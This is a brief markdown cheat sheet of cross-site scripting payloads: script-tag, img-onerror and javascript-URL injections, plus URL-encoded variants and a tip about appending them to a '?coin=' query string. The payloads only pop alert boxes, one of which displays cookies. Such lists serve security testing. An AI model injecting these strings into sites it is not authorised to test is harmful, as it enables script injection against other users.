## XSS Payloads

`<script>alert('XSS')</script>`

`<script>alert(document.cookie)</script>`

`<script>alert('Hacked!')</script>@test.com`

`<script>alert(document.domain + 'XSS: File Content')</script>`

`">Hacked!<script>alert('Hacked')</script>`

`"><script>prompt(1)</script>`

`">hello<IMG SRC=javascript:alert(1)>om"`

`<img src=x onerror="alert('XSS: Developer Hates Scripts!')">`

`"><img src="x" onerror="alert('XSS')">`

`">hello<IMG SRC=javascript:alert(test)>"`

## URL
Add `?` to the URL before any of the listed payloads. 

`?coin=btc`

`?<img src =x onerror=confirm("COINS_HACKED!")>`

## HTML or URL Encoding
`%22%3E%3Cscript%3Ealert%28%27XSS%3A+Encoded%21%27%29%3C%2Fscript%3E`
  
  `%22%3Ehello%3CIMG+SRC%3Djavascript%3Aalert%281%29%3E%[40test.com](http://40test.com/)%22`
